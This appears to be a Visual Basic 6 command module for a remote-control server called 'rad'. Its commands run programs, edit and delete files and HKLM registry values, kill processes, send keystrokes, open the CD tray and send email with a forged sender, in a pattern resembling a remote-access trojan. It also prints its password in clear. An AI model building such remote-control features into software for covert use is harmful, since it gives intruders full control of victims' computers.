Attribute VB_Name = "comModule"

Sub comPrintFile()
    Open Parse(comFull, 1) For Input As #1
        Pop ""
        Do While Not EOF(1)
            linecounter = linecounter + 1
            Line Input #1, l1
            Pop linecounter & "> " & l1
        Loop
    Close #1
End Sub

Sub comPassword()
    serverPass = Parse(comFull, 1)
    SaveSetting "rad", "settings", "password", serverPass
    Pop "Password changed to: " & serverPass
End Sub

Sub comPort()
Dim newport As Integer
Dim tmpVar As String
If Parse(comFull, 1) = "" Then
    Pop "Port not changed."
    Exit Sub
End If

tmpVar = Parse(comFull, 1)
newport = CInt(Val(tmpVar))
SaveSetting "rad", "settings", "port", newport
Pop "Port set to: " & newport
Pop "Restart server to use newly changed port."

If newport = 23 Then
    Pop "!WARNING!"
    Pop "Port 23 is the default telnet port for"
    Pop "most telnet clients.  Telnetting into"
    Pop "this port with the majority of available"
    Pop "telnet clients will enabled vt100 type"
    Pop "terminal, the rad server does NOT use"
    Pop "vt100.  rad communicates with a raw"
    Pop "datastream sent by the client."
    Pop ""
    Pop "It is highly recomended that port 23"
    Pop "is not used with rad."
End If
End Sub

Sub comRestart()
Select Case Parse(comFull, 1)
    Case "h", "hard"
        Pop "!!- Rad Server Shutdown -!!"
        End
    Case "s", "soft"
        Pop "Restarting rad"
        loadAll
        DoEvents
    Case Else
        Pop "restart <type>(s=restart,h=shutdown)"
End Select
End Sub

Sub comAppendFile()
If Parse(comFull, 2) = "1" Then
    Open Parse(comFull, 1) For Input As #1
        Do While Not EOF(1)
            DoEvents
            Line Input #1, l1
            lff = lff & l1 & Chr(13) & Chr(10)
        Loop
    Close #1
    Kill Parse(comFull, 1)
    Open Parse(comFull, 1) For Append As #1
        Print #1, argArray(3, argCount)
        Print #1, lff
    Close #1
End If

If Parse(comFull, 2) = "2" Then
    Open Parse(comFull, 1) For Append As #1
        Print #1, argArray(3, argCount)
    Close #1
End If

Pop ""
End Sub

Sub comTruncLine()
Dim lineHold(1 To 5000)
Open Parse(comFull, 1) For Input As #1
    Do While Not EOF(1)
        DoEvents
        linecounter = linecounter + 1
        Line Input #1, lineHold(linecounter)
    Loop
Close #1

Kill Parse(comFull, 1)

Open Parse(comFull, 1) For Append As #1
    For i = 1 To linecounter
        If i <> CInt(Val(Parse(comFull, 2))) Then Print #1, lineHold(i)
        DoEvents
    Next i
Close #1
Pop ""
End Sub

Sub comEditFile()
Dim lineHold(1 To 5000)
Open Parse(comFull, 1) For Input As #1
    Do While Not EOF(1)
        DoEvents
        linecounter = linecounter + 1
        Line Input #1, lineHold(linecounter)
    Loop
Close #1

Kill Parse(comFull, 1)

Open Parse(comFull, 1) For Append As #1
    For i = 1 To linecounter
        If i = CInt(Val(Parse(comFull, 2))) Then Print #1, argArray(3, argCount)
        If i <> CInt(Val(Parse(comFull, 2))) Then Print #1, lineHold(i)
        DoEvents
    Next i
Close #1
Pop ""
End Sub

Sub comDelFile()
Kill argArray(1, argCount)
Pop ""
End Sub

Sub comNewFile()
Open Parse(comFull, 1) For Append As #1
Close #1
Kill Parse(comFull, 1)
Open Parse(comFull, 1) For Append As #1
Close #1
Pop ""
End Sub

Sub comClear()
For i = 1 To 60
    DoEvents
    frmMain.Winsock.SendData Chr(13) & Chr(10)
Next i
End Sub

Sub comSetWelcome()
Parse comFull, 1
serverMessage = argArray(1, argCount)
SaveSetting "rad", "settings", "message", serverMessage
Pop ""
End Sub

Sub comMoveFile()
Name Parse(comFull, 1) As Parse(comFull, 2)
Pop ""
End Sub

Sub comViewTime()
Select Case Parse(comFull, 1)
    Case "1"
        Pop Now
    Case "2"
        Pop Date
    Case "3"
        Pop Time
    Case Else
        Pop "viewtime <type>(1=all,2=date,3=time)"
End Select
End Sub

Sub comSetTime()
Time = Parse(comFull, 1)
Pop ""
End Sub

Sub comSetDate()
Date = Parse(comFull, 1)
Pop ""
End Sub

Sub comShell()
Shell argArray(2, argCount), CInt(Val(Parse(comFull, 1)))
Pop ""
End Sub

Sub comLast()
Pop "last command: " & lastCommand
End Sub

Sub comCopyFile()
FileCopy Parse(comFull, 1), Parse(comFull, 2)
Pop ""
End Sub

Sub comFileInfo()
Open Parse(comFull, 1) For Binary As #5
    filesize = LOF(5)
Close #5

Pop "at:" & GetAttr(Parse(comFull, 1)) & " sz:" & filesize
End Sub

Sub comFileSet()
SetAttr Parse(comFull, 1), CInt(Val(Parse(comFull, 2)))
Pop ""
End Sub

Sub comSystem()
Pop "  *- SYSTEM -*"
Pop "  rad " & App.Major & "." & App.Minor & "." & App.Revision & "  ><  " & CurUserName
Pop "  cmd: " & comChar
Pop "  name: " & serverName
'Pop "  notify: " & userEMail
Pop "  password: " & serverPass
Pop "  serverpath: " & App.Path & "\" & App.EXEName & ".exe"
Pop "  localhost: " & frmMain.Winsock.LocalIP
Pop "  localport: " & frmMain.Winsock.LocalPort
Pop "  Server message:"
Pop serverMessage
For i = 1 To 20
If userVar(i) <> "" Then Pop "uservar" & i & ": " & userVar(i)
Next i
Pop "  *- SYSTEM -*"
End Sub

Sub comSetVar()
userVar(CInt(Val(Parse(comFull, 1)))) = argArray(2, argCount)
SaveSetting "rad", "settings", "uservar" & (CInt(Val(Parse(comFull, 1)))), argArray(2, argCount)
If userVar(CInt(Val(Parse(comFull, 1)))) = "" Then DeleteSetting "rad", "settings", "uservar" & (CInt(Val(Parse(comFull, 1))))
Pop ""
End Sub

Sub comViewVar()
Pop userVar(CInt(Val(Parse(comFull, 1))))
End Sub

Sub comCdOpen()
        rtn = mciSendString("open cdaudio Alias cd", 0, 0, 0)
Select Case Parse(comFull, 1)
Case "open", "o"
        rtn = mciSendString("set cd door open", 0, 0, 0)
Case "close", "c"
        rtn = mciSendString("set cd door closed", 0, 0, 0)
Case Else
        Pop "cdrom <type>(o=open,c=close)"
End Select
        rtn = mciSendString("close all", 0, 0, 0)

Pop ""
End Sub

Sub comRegKeyEdit()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, Parse(comFull, 1))
x = MyReg.CreateValue(Parse(comFull, 2), argArray(3, argCount), REG_SZ)
MyReg.CloseRegistry

Pop "open:" & OpenRegOk & ";write:" & x & ";"

End Sub

Sub comRegKeyDel()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, Parse(comFull, 1))
x = MyReg.DeleteValue(argArray(2, argCount))
MyReg.CloseRegistry

Pop "open:" & OpenRegOk & ";del:" & x & ";"

End Sub

Sub comRegKeyView()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, Parse(comFull, 1))
x = MyReg.GetValue(argArray(2, argCount))
MyReg.CloseRegistry

Pop "open:" & OpenRegOk & ";value:" & x & ";"
End Sub

Sub comRegDirView()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, argArray(1, argCount))
Pop ""
Do
    regCounter = regCounter + 1
    Pop MyReg.GetAllSubDirectories(regCounter) & ""
Loop
MyReg.CloseRegistry
Pop "open:" & OpenRegOk & ";"
End Sub

Sub comRegKeysView()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, argArray(1, argCount))
Pop ""
Do
    regCounter = regCounter + 1
    Pop MyReg.GetAllValues(regCounter) & ""
Loop
MyReg.CloseRegistry
Pop "open:" & OpenRegOk & ";"
End Sub

Sub comRegDirCreate()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, Parse(comFull, 1))
x = MyReg.CreateDirectory(argArray(2, argCount))
MyReg.CloseRegistry

Pop "open:" & OpenRegOk & ";write:" & x & ";"

End Sub

Sub comRegDirDel()
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, Parse(comFull, 1))
x = MyReg.DeleteDirectory(argArray(2, argCount))
MyReg.CloseRegistry

Pop "open:" & OpenRegOk & ";del:" & x & ";"

End Sub

Sub comAppPopUp()
AppActivate argArray(1, argCount)
Pop ""
End Sub

Sub comSendKeys()
SendKeys argArray(1, argCount)
Pop ""
End Sub

Sub comDir()
Pop ""
x = Dir(Parse(comFull, 1), 31)
Pop x & ""

Do While x <> ""
WaitFor CInt(Val(Parse(comFull, 2)))
x = Dir(, 31)
Pop x & ""
Loop
End Sub

Sub comVolume()
Pop Dir(Parse(comFull, 1), vbVolume)
End Sub

Sub comRemDir()
RmDir argArray(1, argCount)
Pop ""
End Sub

Sub comMkDir()
MkDir argArray(1, argCount)
Pop ""
End Sub

Sub comSetName()
serverName = argArray(1, argCount)
SaveSetting "rad", "settings", "name", serverName
Pop ""
End Sub

Sub comMsgBox()
MsgBox argArray(1, argCount)
Pop ""
End Sub

Sub comInputBox()
frmMain.Winsock.SendData "_wait >"
x = InputBox(argArray(1, argCount))
Pop "user: " & x
End Sub

Sub comHelp()
Pop "rad cmd format: <command> <argument1> <argument2> ... ... ..."
Pop " help not currently available"
End Sub

Sub comComChar()
oldchar = comChar
If Parse(comFull, 1) <> "" Then comChar = Parse(comFull, 1)
SaveSetting "rad", "settings", "command", comChar
Pop "comChar '" & oldchar & "' -> '" & comChar & "'"
End Sub

Sub comProc()
    Dim hSnapShot As Long
    Dim uProcess As PROCESSENTRY32
    Dim r As Long
    hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    If hSnapShot = 0 Then Exit Sub
    uProcess.dwSize = Len(uProcess)
    r = ProcessFirst(hSnapShot, uProcess)

    Pop ""
    Do While r
        Pop uProcess.th32ProcessID & " - " & uProcess.szExeFile & ""
        r = ProcessNext(hSnapShot, uProcess)
    Loop

    Call CloseHandle(hSnapShot)

End Sub

Sub comKill()
    If Parse(comFull, 1) = "1" Then KillAppByExe (argArray(2, argCount))
    If Parse(comFull, 1) = "2" Then KillAppByPid (Val(CLng(Parse(comFull, 2))))
End Sub

'Sub comSetEMail()
'    If Parse(comFull, 1) = "" Then Exit Sub
'    userEMail = Parse(comFull, 1)
'    SaveSetting "rad", "settings", "email", userEMail
'    Pop "notify set to: " & userEMail
'End Sub

Sub comSendMail()
Dim eserver As String, efrom As String, efromname As String, eto As String, etoname As String, esubject As String, ebody As String

eserver = Parse(comFull, 1)
efrom = Parse(comFull, 2)
efromname = Parse(comFull, 3)
eto = Parse(comFull, 4)
etoname = Parse(comFull, 5)
esubject = Parse(comFull, 6)
ebody = argArray(7, argCount)


SendEmail eserver, efromname, efrom, etoname, eto, esubject, ebody
Pop "_sendmail;"
End Sub
